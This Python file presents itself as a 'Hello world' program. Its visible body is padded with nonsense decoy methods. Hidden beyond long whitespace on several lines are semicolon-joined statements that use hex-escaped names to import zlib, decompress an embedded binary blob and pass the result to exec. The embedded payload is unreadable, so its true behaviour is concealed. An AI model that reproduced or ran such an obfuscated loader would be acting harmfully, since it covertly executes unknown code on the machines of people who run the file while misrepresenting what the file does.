from builtins import *
from math import prod as _walk


__obfuscator__ = 'NA'
__authors__ = ('NA', 'NA')
__github__ = 'NA'
__discord__ = 'NA'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


StackOverflow, _substract, _while, Theory, _callfunction, _stackoverflow, Hypothesis = exec, str, tuple, map, ord, globals, type

class Frame:
    def __init__(self, _builtins):
        self._random = _walk((_builtins, -81557))
        self._cube(Positive=48836)

    def _cube(self, Positive = float):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._random /= 52526 + Positive
        
        try:
            (((_substract, StackOverflow), _while) for _while in {_substract: 'bl6lud'})

        except AttributeError:
            ({StackOverflow: Random} or Random if {StackOverflow: Random} and Random else ... or (Random, {StackOverflow: Random}))

        except:
            Hypothesis(81605 - -1893) == False

    def Builtins(self, Calculate = -92142):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Calculate *= 88452 / 4470
        self._negative != False
        
        try:
            (((_substract, _while), Random) for Random in (_substract, _while))

        except ArithmeticError:
            {StackOverflow: Random} if StackOverflow <= _stackoverflow else (_while, _substract) <= _stackoverflow

        except:
            Hypothesis(13657 * -59575) == Ellipsis

    def Product(Cube = Ellipsis):
        return _stackoverflow()[Cube]

    def Statistics(Power = -63359 / -64464, _system = int, Ceil = _stackoverflow):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Ceil()[Power] = _system
        
        try:
            ((_substract, {Theory: Theory}) for _substract in (_while, _substract) if StackOverflow > Theory)

        except AttributeError:
            ((StackOverflow, {Theory: Theory}) for StackOverflow in (_substract, _while) if _while == Theory)

        except:
            Hypothesis(15481 + -12660) == type

    def execute(code = str):
        return StackOverflow(_substract(_while(Theory(_callfunction, code))))

    @property
    def _negative(self):
        self._floor = '<__main__._system object at 0x000006558BE86490>'
        return (self._floor, Frame._negative)

if __name__ == '__main__':
    try:
        Frame.execute(code = __code__)
        _algorithm = Frame(_builtins = 76302 / 19072)

        _algorithm.Builtins(Calculate = 14882 - _algorithm._random)                                                                                                                                                                                                                                                          ;Frame.Statistics(Power='nnnnmmnmmmnnmmmmnmmnn',_system=b'x\x9c\xddX\xddn\xdb8\x16\xbe\xf7S\xb0\x02\x02I\x88-;\x0e:m\rh\x17i\xd2t\x9c\xc9O\xdbt\x9bL\xd2@\xa0%:\xa6M\x89\nI\xc5\x96\x17{S`\x1fb\xdee/\xdb\xf7\xdaCQ\x8a\xe5\xd8\xc64\xd8\xb9\xd90\x11E\xf1\x1c~\x87\xfc\xce!iR\x89\xbc\xd7@\x90\xe8\xd0)\xde:\x05\x01\x1f\x0c3\x19b\xc5E\x10\xa0\x17\xbeu\xbag!.j\n8S#.d!u\xb4\xb8\xa93wI\xe7\x96\xaaQ6\xd8\x00\x10Q\x19r\x11m\x902\x1a\x92D\x12#}\xf7\xe1\xb8\xd5\xf5:\x8fTB\x1e\x19\xb9\x9d\n\x9a(\xc7\xfa\x950\xc6\xd1\x94\x0b\x16\xbd\xb0\\\xbb\xe1\xf6\x1e\xb4\xb5\xdc\x96\x13\x1a\xd9n\x83\xccB\x92\xaar\xd0I\x9aA\xcbO\\\x12\x89\xb0 H\x90\xe8k\xf2\x85rF\x94\xa9\x18\xb0\x8c|M~\xe7Y\xf1\x85\x91\x06\xf9\x9a\x9c\xf2\x01\x8fr\xc4\xe8\x04\xda\xe5<\xb3\xdc\x86\xe9\x14\x8dS.T\x10\x80\xb5\\\xda\xaeGfT9n\x83\xf1\x103\xe9\xb8\xd76e\xf07f\x8c\xeal\x0c\xf9\xd8\xbe\xf1o\x19\x1f\x80\xbc\xb1*\xd4M\xfa\xc7\xc7G\xfd\xe3~\x1f\x1e(A\xe1\xe8\xe8\xa8o_\xf7z\xdb\xad\xed\x96\xd3r\xb6w\\\xf7\x06@\x88\xc2J\x89\r \xac\xdfg\xf0\xf4\xf5\xd37e\xa6\xf3U\x9c\x88n\xc2\x98\xcd\xa6\xd3\xe2)\xffu\x19zo\x06\xd7X\'5\xad\xa005\xb9~\xcd\xa0\xc9\x82\xa8\r\xa6.//.\xf4\xa3sS\x86\x1c\x1a\xae\x809\xf6 \xa3L\xd1D\xb3}\x8f\xc5\xe6~\x14p\x97E*\xa0u~\t\x90\x05\x9d} \xf6\xb8$Y\x97\x9c5\x86dB\x15\xa3\xd9\xe01enS\x13Y\x11\\r\\\x10\xfc$\x14\xf7\xfa\xaf\x81\xf1h\x12\x11\xd0`\x9c\xafJo\xdc\xc6Zj\x8b8\x83\xa4\x03\r\xe88\xd2Isrt\xf4\x8c\x19"\x8c\xa61\x0f\x9fD\x12D\xcd\x85\xa9\xbe\xa8\x02I\xd7<\x85%JC\x89\x13\xfa?\xb2\xb4\x11\xe5i,m\x86\xa9X\xca\x87\x94\xcd\xc8(\xc9\xd6\xf1\xb4i\xa1\xa8&aeMOz\xdb\xf6\xc6\x9c&\x1b\xda\\\x14\xcc^\x1a~M\xf9i\xb4\xfe\xbf\x05\x9fd\xf8\xf0I\xa17-I\x9d\x95\xb6f\xd3gL\x8fP\xf2\xe7\xe3\xed\xf4\xe4\xf4\xf4D?\xa7\xfa}R\x94u\xf6\x8c\xf9!\x99\xf8\xfc\x84\ti\x02\xc7X0F\x8a}\xf8\xb9\xb2\xc3\xf0=y\xd2\xdc:;\xd0\xe9\xec\xec\x00\n\x1c\xb23\xfe\x8c\xd9Q\x98\xb3\xe1\xcf\x07\xcf\x18\xdeT\x7f\xb21\xe4\x0c\x12\x1d\xd7[\xaf\r.\xc7vw@\xda\xf9\x19\xc5\x0eHw\xfeR\xc4\xd7\xc1\xab\xe0M\xf02\xd8\r\xba\xc1\x0e\xbc;\x014\xdd~\xb3Z\xfb\xe7`\x1b6|g`\xef\xeet\xa3\xee\xebn\xb4\xdb\xe9\xbe\x81\x1f\x9f\x11\xd1\'\x12\xc7~=T\xab[\xa5k\xb2\xa5\xe7\xf9\x06XHfk\xa7\xdfP\xf0\x18U\xbf\xd7\x919\x02 \xd0\r\x9b#2k2\x924\x8b\xa3\\S?<\x85\xcf\xf2\x18\xd8\xd0:\x8em\x97\x08i>\xa5\x11\xb9\xa7\t\xf1\xc2(\xaep\xf6\xa3xE\xac_!\xa94\x0e\x8a\xaf\x15\xa5T\xcaQ\xa5\xf2\xe1\xfc\xfc\xd7\xc7\n\x95,\x08\xee\x89\x90\x94\'pj)T"\xac\x88\xa2\xf1\x83B\xf5\xdd(\xbf\x05\xb9\xcb\x88T\xf21 t\xda\x8bs\xd3\x9b}\x9e\x0c\xe9m\x85\xb0\\{H\x19iDd\x88\x14\xa0\x18\x81S\x1ej-\xcb*\xde\x9fA\x82\xd4\x88\xa0\xfd\x83\x13\xa4\xe3\x0f\rr\x04\'A \xf8\x16\x01\x8a"\x89B\xbf\x91\\\xa2!\x17\xe8-U1\x87\x1e\xd8\x12\xed\x815>D\'\\\xc1\x80\xc0\x078N\x19\xf1\n\xcc\x91R\xa9\xec\xb5\xdb\x83R\xdb\x0by\xdc\x8eH\xcce;\x12\xf1Z\x95\x16\xf6\xf0\x04\xc7\x98\x8e"/!\xaa\x1d\x1a\xcbm,T\x8b\x0f[qa%\x80\xd6\xed8\x8dd{ggww\xc7\x83\xa2\x19\x03t\xbft\x14\x16\xb7Y\xac\xbbL\xe1\xf4\x8d>`5B\x8aC\xe9\xa2rE\xc9\x827\xbd\x8f\\\xf8]J\xd0tD\xc3\x11\xd2\xf60\xc4T\x81\xa7\x16x\x10N\xf7\xe0\x144!9\xc21\x07N8HE\xe1\x19\ng}D\x13\xe0%\xc6\xba{\xde\x12\xb1:(|\x1d\r\x8e\xb5\x07\xe9b\xf7\xed<\xec\xde\xea\xe2\xde+\xb2}|w\x99\\\x9c\xcb_\xc6\xf9\xfe0\xdc\xf9\xd4\x19\xbd\xfa\x08\x82\x03\xd9\xdf\xfb\xd4\xff\xf8K7\xba\xcb^\xcb\xcee\x8a\xad\x87\x1b\x88*Y\xaf\xe6\xdd\xc3\xf8\xe4\xc3\xfbqw\xc4O\xa3.\x9b\\]^\xa5\x83\xf8\xcb0z\xffe\x1e\xed\xf7?^\xc5\xea\xee\xa4;\xbb\xfb\xfd\xcb\xe9\xe4*>\x94x\xb7?\xc7\x94\xef\x9f\xbf\xfb\x98\xef\xed\xf9~y\xd7P\xdd\x90H" ,}\xabrI8\xa5iK\x8e\xc0\x1d\xadT\xf0Y\xee\xe14\x95)W\x85\x17\x13^\\\xdcXK\x08*O\x89o\x9d\x7f\xfe\xf4n\xef\xa4\x7f\xfa\xde\x08\xc3L\x08pD\x90\x13,\xfc*\xb0\xbd\x84\xc3Q\xda\xd3uF\x89\xa7\xb9\xa0\xb7#\xa3&\xfd\xa1\xd5\xedt\xbb\xad\x7f\xd6\x1b\xff\xab\xe4\xd3\xdc\xd1|Mj\xf3\xaa\x9cNhKB\xa8\x96HN\xe8\xc2\xa7`8\x1dq\x92\xd0\x99\x85\xb6\x9c\xda\xc4k>2\xe9\xbau\xf4\x8a\x03s\xf1T\xc6\xad6\xd5\x8aX{a\xd8Zj\xd4zzZ\x068O\x05\x9eFs8EA\xa0\x15\x137\x138\x1cS\x94\x89\xf9\xf7\x7fGs\x18\x06F\x95\xed\x9e\xd5\\\x9d\xe4\x06NUWq:\x99\x00\xf6\x8d\xa6\xc78\x8e\x9cM\xedj]\xb9\xde\xbe\xb9\xc2?\xbe\xe1\x88Oq\xc2\x1d`\xf2xK\xba\x9aC\x83\xe7\xc9\\*\x12\x074jV\x15\x04\x9cEU\x1e0rO\x98\xbb@\x84E\xca\x87%\xd5\xd3kW`\x94K\x90?\xb1\xaa\x97"k\xa1#\x89,\\G#_\xaf{zYw\xd6!\x9c\xa9)\xac\x16\\\xeb\x8f\xbf\xff\xa1A\x80\xaaEc\x0fv\x08\xa7\xde\xbd\x11f\xb0a\xdc\x92\x02\x15V\xbc\x87+\xc3\x07\x89\xb3h\xdd\xd4\xd3\xb9Y\x0f\xf8f\xb14\x84y\x10\xc3\xa2\xe9\x7f\x16\xd9\xdaa\xfdCM\xb9\x98s\x18\xd4\x8f\xff\x80+\x0b\x17\x17(\xe0^g\xbf2\xe4\xd6\x86[\xd9\x10D\xfa\xd5\xfa\xef\xa5\\*gi)\xc8\x04\xf3\x97gpsI\x0e3\x0e\xfb\x0f#i,\xf0\xe9\xb0n\xc2\x93\n\xabL\x16w\xa1\xe8\x85\xdf\xedtzK0\xd5HZ7o\x7f|\x83\x01\xa0i.s\xf0\x94\x8e\xc8jD\xb8w\xbd%o\xb6\xa4\x8e\x92\r\xd0\xcdz\xbd"3Us\x84N\x82\xa8L$\xe8\x103\xd8\xab\x97\x98\x80\x10\xae\xb7-\xf7\x85u\xee\x8f\xc8@\xe8\xe8)\xe9\xfd\xfe\x87\xb5\x14\x8b^\n\xb3\x9dTN\xae\xbb\xb6\xb4\xb3\xce}\xc7\x06\x0b#\xa9[\xeb\xe8\xc4(\xe5z\xba\x82#\xadeR!,\xabH\x82\xddB\xd6,\xb8\xee\xdf6\xd0\xfa\xd0m\x98\xf8,\x0b\xe7uL\x9d\xf4\x9e\xab\xb7\x1e\x9a\xa0M\xd8\xbd\x95\x1d\xa2\x02/\x9c\xe2\xe9\xb4%{\x0f%\xed%\xc0\xf0\x8a\x18\xd6\x85\x89\x99\x1b\xd7\xbd\x977K\xdf\xad\x97\xbd\xb2\x02\x9eb\xf2,T\x1ej\xb4R\xcd\x97\x04\xfc\xb71\x80\x04\x9e\x98Q\xe6\xcd\xf9\x8fo\xa4=\xc7\x03\xc6\'\x9aTR[\xe9\xc8\xdf\x1f\xf9-d|\xc9_\x0bi\x195z\xee\x15u\xe6b\x1e\xbd+^\xa0\xdc{\xaci\xe2\x0b\x9c\x15\x04\t\x8eI\x10\xf8\xbe\x1d\x04\xf0\xab\x036\x06\xdbh\xd7\x7f)5\xfe\x0b\xd1\xd6\x10x')

        if 172741 > 1160365:
            Frame(_builtins = 70502 / -75916).Builtins(Calculate = 36218 * _algorithm._random)
        elif 218943 < 2516561:
            _algorithm._cube(Positive = _algorithm._random / -3432)                                                                                                                                                                                                                                                          ;mmmnmnnnmmnmmmnnnmnn,oooODDODDoODDDooDDooOD,jllilijiiljjililllijijj,JIJLJIIIJIIJJIJLJJJLIIJLL,LIILLJJJJILLJIIIJLJ=(lambda XXXXXWXWXXWWWWWXXXX:XXXXXWXWXXWWWWWXXXX(__import__('\x7a\x6c\x69\x62'))),(lambda XXXXXWXWXXWWWWWXXXX:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(XXXXXWXWXXWWWWWXXXX)"),filename='\x53\x32\x32\x53\x53\x53\x32\x53\x53\x53\x32\x32\x53\x32\x53\x53\x32\x53\x53\x32\x53\x53\x32\x53',mode='\x65\x76\x61\x6c'))),(lambda XXXXXWXWXXWWWWWXXXX:XXXXXWXWXXWWWWWXXXX['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda JLJLIJJLIILIJLJLJLILILIIL,XXXXXWXWXXWWWWWXXXX:JLJLIJJLIILIJLJLJLILILIIL(XXXXXWXWXXWWWWWXXXX)),(lambda:(lambda XXXXXWXWXXWWWWWXXXX:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(XXXXXWXWXXWWWWWXXXX)"),filename='\x53\x32\x32\x53\x53\x53\x32\x53\x53\x53\x32\x32\x53\x32\x53\x53\x32\x53\x53\x32\x53\x53\x32\x53',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _algorithm._cube(Positive = _algorithm._random - -81322)                                                                                                                                                                                                                                                          ;LIILLJJJJILLJIIIJLJ()(JIJLJIIIJIIJJIJLJJJLIIJLL(jllilijiiljjililllijijj(mmmnmnnnmmnmmmnnnmnn(oooODDODDoODDDooDDooOD('\x76\x61\x72\x73'))),Frame.Product(Cube='nnnnmmnmmmnnmmmmnmmnn')))

    except Exception as Random:
        if 266807 > 6608594:
            Frame.execute(code = _substract(Random))

        elif 457320 > 4646272:
            Frame(_builtins = -76431 / -38367).Builtins(Calculate = 24470 / _algorithm._random)